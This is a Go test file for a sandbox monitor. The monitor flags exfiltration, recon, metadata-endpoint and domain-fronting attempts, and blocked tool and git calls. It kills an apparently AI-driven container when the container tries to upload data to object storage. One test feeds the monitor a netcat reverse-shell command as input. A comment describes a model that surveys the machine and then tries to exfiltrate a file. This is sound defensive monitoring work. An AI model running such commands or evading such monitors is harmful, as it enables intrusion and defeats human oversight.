package monitor

import (
	"context"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/FolksyPizza/rig/internal/egress"
	"github.com/FolksyPizza/rig/internal/watchdog"
)

func egressLine(t *testing.T, ev egress.Event) []byte {
	t.Helper()
	ev.Event = "egress"
	b, err := json.Marshal(ev)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func TestEgressRules(t *testing.T) {
	r := NewRules(0, false)
	cases := []struct {
		ev   egress.Event
		kind string
		sev  watchdog.Severity
	}{
		{egress.Event{Phase: "deny", Host: "probe.oss-cn-beijing.aliyuncs.com", Reason: egress.ReasonRisky, Category: egress.RiskObjectStorage}, "exfil_attempt", watchdog.SevCritical},
		{egress.Event{Phase: "deny", Host: "ipinfo.io", Reason: egress.ReasonRisky, Category: egress.RiskRecon}, "recon_attempt", watchdog.SevHigh},
		{egress.Event{Phase: "deny", Host: "169.254.169.254", Reason: egress.ReasonIPLiteral}, "internal_access_attempt", watchdog.SevHigh},
		{egress.Event{Phase: "deny", Host: "allowed.example", SNI: "evil.example", Reason: egress.ReasonSNIMismatch}, "domain_fronting_attempt", watchdog.SevHigh},
		{egress.Event{Phase: "deny", Host: "example.com", Port: 22, Reason: egress.ReasonPort}, "port_blocked", watchdog.SevMedium},
		{egress.Event{Phase: "deny", Host: "unlisted.example", Reason: egress.ReasonNotAllowlisted}, "egress_denied", watchdog.SevLow},
		{egress.Event{Phase: "open", Host: "api.anthropic.com"}, "egress_open", watchdog.SevInfo},
		{egress.Event{Phase: "close", Host: "api.anthropic.com", BytesUp: 100 << 20}, "large_upload", watchdog.SevMedium},
		{egress.Event{Phase: "close", Host: "api.anthropic.com", BytesUp: 1024}, "egress_close", watchdog.SevInfo},
	}
	for _, tc := range cases {
		o, ok := r.Line(egressLine(t, tc.ev))
		if !ok || o.Kind != tc.kind || o.Severity != tc.sev || o.Source != "egress" {
			t.Errorf("%+v -> %+v, want %s/%s", tc.ev, o, tc.kind, tc.sev)
		}
	}
}

func TestDeniedAttemptsEscalateByLevel(t *testing.T) {
	deny := egress.Event{Phase: "deny", Host: "unlisted.example", Reason: egress.ReasonNotAllowlisted}

	lockdown := NewRules(1, true)
	if o, _ := lockdown.Line(egressLine(t, deny)); o.Severity != watchdog.SevMedium {
		t.Errorf("lockdown: the first blocked attempt should be a violation, got %s", o.Severity)
	}

	strict := NewRules(3, true)
	var sevs []watchdog.Severity
	for i := 0; i < 3; i++ {
		o, _ := strict.Line(egressLine(t, deny))
		sevs = append(sevs, o.Severity)
	}
	if sevs[0] != watchdog.SevLow || sevs[1] != watchdog.SevLow || sevs[2] != watchdog.SevMedium {
		t.Errorf("strict: the third attempt in a minute should escalate, got %v", sevs)
	}

	// Attempts older than a minute do not count.
	clock := time.Now()
	old := NewRules(2, true)
	old.now = func() time.Time { return clock }
	old.Line(egressLine(t, deny))
	clock = clock.Add(2 * time.Minute)
	if o, _ := old.Line(egressLine(t, deny)); o.Severity != watchdog.SevLow {
		t.Errorf("an attempt from two minutes ago should not count, got %s", o.Severity)
	}

	standard := NewRules(0, false)
	for i := 0; i < 10; i++ {
		if o, _ := standard.Line(egressLine(t, deny)); o.Severity != watchdog.SevLow {
			t.Fatalf("standard never escalates plain denials, got %s", o.Severity)
		}
	}
}

func TestOtherLineRules(t *testing.T) {
	r := NewRules(0, false)
	lines := map[string]struct {
		kind string
		sev  watchdog.Severity
	}{
		`{"event":"mcp","server":"blender","tool":"execute_blender_code","action":"deny","reason":"matches deny rule"}`: {"mcp_tool_blocked", watchdog.SevMedium},
		`{"event":"mcp","server":"blender","tool":"get_scene_info","action":"allow"}`:                                   {"mcp_tool_call", watchdog.SevInfo},
		`{"event":"git","repo":"a/b","op":"push","action":"deny","reason":"branch main not allowed"}`:                   {"git_push_refused", watchdog.SevHigh},
		`{"event":"git","repo":"x/y","op":"fetch","action":"deny","reason":"not on list"}`:                              {"git_repo_refused", watchdog.SevMedium},
		`{"event":"relay","port":"ollama","phase":"error","error":"nothing is listening"}`:                              {"host_port_unavailable", watchdog.SevLow},
		`{"event":"mcp_stderr","server":"blender","line":"connected"}`:                                                  {"mcp_stderr", watchdog.SevInfo},
	}
	for line, want := range lines {
		o, ok := r.Line([]byte(line))
		if !ok || o.Kind != want.kind || o.Severity != want.sev {
			t.Errorf("%s -> %+v, want %s/%s", line, o, want.kind, want.sev)
		}
	}
	if _, ok := r.Line([]byte("not json")); ok {
		t.Error("non-JSON lines should be ignored")
	}
}

func TestProcessRules(t *testing.T) {
	r := NewRules(0, false)
	if o := r.Process("nc", "nc -e /bin/sh 203.0.113.5 4444"); o.Kind != "suspicious_tool" || o.Severity != watchdog.SevHigh {
		t.Errorf("netcat should be suspicious: %+v", o)
	}
	if o := r.Process("payload", "/tmp/payload --x"); o.Kind != "exec_from_temp" || o.Severity != watchdog.SevMedium {
		t.Errorf("running from /tmp should be flagged: %+v", o)
	}
	if o := NewRules(0, true).Process("payload", "/dev/shm/x"); o.Severity != watchdog.SevHigh {
		t.Errorf("strict levels treat it as high: %+v", o)
	}
	if o := r.Process("node", "node /usr/bin/claude"); o.Severity != watchdog.SevInfo {
		t.Errorf("ordinary processes are info: %+v", o)
	}
	if o := r.Process("app", "./build/app --serve"); o.Severity != watchdog.SevInfo {
		t.Errorf("below lockdown, workspace programs are ordinary: %+v", o)
	}

	lock := NewRules(1, true)
	lock.ExecOnlyFromImage = true
	for _, args := range []string{"./build/app", "/home/sandbox/workspace/payload -x", "../x"} {
		if o := lock.Process("x", args); o.Kind != "exec_outside_image" || o.Severity != watchdog.SevHigh {
			t.Errorf("lockdown must flag %q: %+v", args, o)
		}
	}
	for _, args := range []string{"/usr/bin/python3 script.py", "git status", "/bin/bash -l", "/opt/grove/bin/grove", "/sbin/docker-init -- x"} {
		if o := lock.Process("x", args); o.Severity != watchdog.SevInfo {
			t.Errorf("lockdown must allow image program %q: %+v", args, o)
		}
	}
}

func TestAuditWriteAndRead(t *testing.T) {
	path := filepath.Join(t.TempDir(), "audit", "audit.jsonl")
	a, err := OpenAudit(path)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 5; i++ {
		if err := a.Write(Record{Kind: "k", Severity: "info", Detail: strings.Repeat("x", i), Data: json.RawMessage(`{"i":1}`)}); err != nil {
			t.Fatal(err)
		}
	}
	_ = a.Write(Record{Kind: "bad-data", Data: json.RawMessage(`{not json`)})
	a.Close()

	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Errorf("audit log mode = %o, want 600", info.Mode().Perm())
	}
	recs, err := ReadAudit(path, 3)
	if err != nil {
		t.Fatal(err)
	}
	if len(recs) != 3 || recs[2].Kind != "bad-data" || recs[2].Data != nil {
		t.Errorf("unexpected records %+v", recs)
	}
	all, _ := ReadAudit(path, 0)
	if len(all) != 6 {
		t.Errorf("expected 6 records, got %d", len(all))
	}
}

type recordingEnforcer struct {
	mu     sync.Mutex
	reason string
}

func (e *recordingEnforcer) Kill(ctx context.Context, reason string) error {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.reason = reason
	return nil
}

type feedRecorder struct {
	mu  sync.Mutex
	obs []watchdog.Observation
}

func (f *feedRecorder) Feed(o watchdog.Observation) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.obs = append(f.obs, o)
}

func TestPipelineStopsAnExfiltrationAttempt(t *testing.T) {
	// The Cohere scenario: a model inventories the machine, then tries to
	// upload a file to an object-storage bucket.
	lines := make(chan []byte, 8)
	lines <- []byte(`{"event":"egress","phase":"open","host":"api.anthropic.com","as":"sandbox","action":"allow"}`)
	lines <- []byte(`{"event":"egress","phase":"deny","host":"bucket.oss-cn-beijing.aliyuncs.com","port":443,"as":"sandbox","action":"deny","reason":"risky_destination","category":"object-storage"}`)
	close(lines)

	dir := t.TempDir()
	audit, err := OpenAudit(filepath.Join(dir, "audit.jsonl"))
	if err != nil {
		t.Fatal(err)
	}
	defer audit.Close()

	enf := &recordingEnforcer{}
	feed := &feedRecorder{}
	var notified []watchdog.Event
	p := &Pipeline{
		Profile:   "demo",
		Container: "rig-demo",
		Policy:    watchdog.Policy{Mode: watchdog.ModeEnforce, Strictness: watchdog.StrictMedium},
		Sources:   []watchdog.Observer{LineSource{Rules: NewRules(0, false), Lines: lines}},
		Enforcer:  enf,
		Audit:     audit,
		Notify:    func(e watchdog.Event) { notified = append(notified, e) },
		AI:        feed,
	}
	cause, err := p.Run(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if cause == nil || cause.Kind != "exfil_attempt" {
		t.Fatalf("expected a kill on the exfiltration attempt, got %+v", cause)
	}
	if !strings.Contains(enf.reason, "aliyuncs.com") {
		t.Errorf("kill reason should name the destination: %q", enf.reason)
	}
	if len(notified) != 1 || notified[0].Action != watchdog.ActionKill {
		t.Errorf("only the kill should be announced, got %+v", notified)
	}
	if len(feed.obs) != 2 {
		t.Errorf("the AI reviewer should see every observation, got %d", len(feed.obs))
	}
	recs, _ := ReadAudit(filepath.Join(dir, "audit.jsonl"), 0)
	if len(recs) != 2 || recs[1].Action != "kill" || recs[1].Severity != "critical" || len(recs[1].Data) == 0 {
		t.Errorf("audit log wrong: %+v", recs)
	}
}

func TestLineSourceFromStream(t *testing.T) {
	pr, pw := io.Pipe()
	go func() {
		pw.Write([]byte(`{"event":"egress","phase":"deny","host":"x.example","reason":"not_allowlisted"}` + "\n"))
		pw.Write([]byte(`{"event":"egress","phase":"deny","host":"skip.example","reason":"not_allowlisted"}` + "\n"))
		pw.Close()
	}()
	src := LineSource{
		Rules:  NewRules(0, false),
		Open:   func(context.Context) (io.ReadCloser, error) { return pr, nil },
		Accept: func(raw []byte) bool { return !strings.Contains(string(raw), "skip.example") },
	}
	ch, err := src.Observe(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	var got []watchdog.Observation
	for o := range ch {
		got = append(got, o)
	}
	if len(got) != 1 || !strings.Contains(got[0].Detail, "x.example") {
		t.Errorf("unexpected observations %+v", got)
	}
}

func TestEvaluatePIDs(t *testing.T) {
	if _, ok := EvaluatePIDs(providerStats(100), 512); ok {
		t.Error("100 of 512 is not pressure")
	}
	if o, ok := EvaluatePIDs(providerStats(470), 512); !ok || o.Kind != "pid_pressure" {
		t.Errorf("470 of 512 should be pressure: %+v", o)
	}
}
